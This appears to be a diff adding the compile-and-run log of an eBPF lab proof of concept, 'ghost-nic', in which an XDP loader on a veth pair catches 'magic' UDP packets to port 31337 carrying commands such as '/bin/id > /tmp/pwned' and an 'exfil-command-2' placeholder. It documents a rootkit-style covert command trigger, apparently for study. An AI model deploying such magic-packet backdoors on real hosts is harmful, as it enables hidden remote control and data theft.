@@ -1,0 +1,21 @@
+--- compile ---
+  GEN  vmlinux.h
+  BPF  build/ch05b-ghost-nic.bpf.o
+  SKEL build/ch05b-ghost-nic.skel.h
+  CC   build/ch05b-ghost-nic
+--- run ---
+=== ch05b trigger from /work/pocs/ch05b-ghost-nic ===
+=== creating veth pair + ghost_ns ===
+=== veth pair up ===
+veth_g0@if318    UP             7e:56:c8:99:ef:cc <BROADCAST,MULTICAST,UP,LOWER_UP> 
+veth_g1@if319    UP             12:6c:0a:ee:65:0a <BROADCAST,MULTICAST,UP,LOWER_UP> 
+=== starting loader on veth_g0 (log: /tmp/ch05b-loader.sr0wRz.log) ===
+=== sending magic UDP to 10.66.66.1:31337 from inside ghost_ns ===
+sent 2 ghost packets
+=== loader output ===
+[ghost] attached XDP (drv-mode) to veth_g0 ifindex=319
+[ghost] polling — Ctrl-C to detach and exit
+[ghost] DROPPED pkt 10.66.66.2:54521 -> 10.66.66.1:31337 cmd='/bin/id > /tmp/pwned'
+[ghost] DROPPED pkt 10.66.66.2:54521 -> 10.66.66.1:31337 cmd='exfil-command-2'
+=== done ===
+Error response from daemon: No such container: dbpf_ch05b_37979
